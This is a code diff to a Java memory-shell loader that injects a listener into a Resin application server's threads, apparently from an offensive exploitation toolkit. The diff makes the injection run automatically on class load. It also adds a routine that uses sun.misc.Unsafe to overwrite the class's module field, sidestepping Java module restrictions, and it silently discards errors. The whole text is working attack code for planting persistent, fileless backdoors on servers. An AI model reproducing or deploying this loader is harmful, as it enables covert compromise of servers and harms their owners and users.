@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -25,7 +26,9 @@ import java.util.zip.GZIPInputStream;
 public class ResinListenerThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
-
+    static {
+        new ResinListenerThreadLoader();
+    }
     public ResinListenerThreadLoader() {
         try {
             inject();
@@ -38,6 +41,7 @@ public class ResinListenerThreadLoader {
      * Resin Listener
      */
     public static void inject() throws Exception {
+        addModule();
         Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
 
         for (int i = 0; i < threads.length; i++) {
@@ -154,5 +158,23 @@ public class ResinListenerThreadLoader {
         return object;
     }
 
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = ResinListenerThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
+    }
 
 }
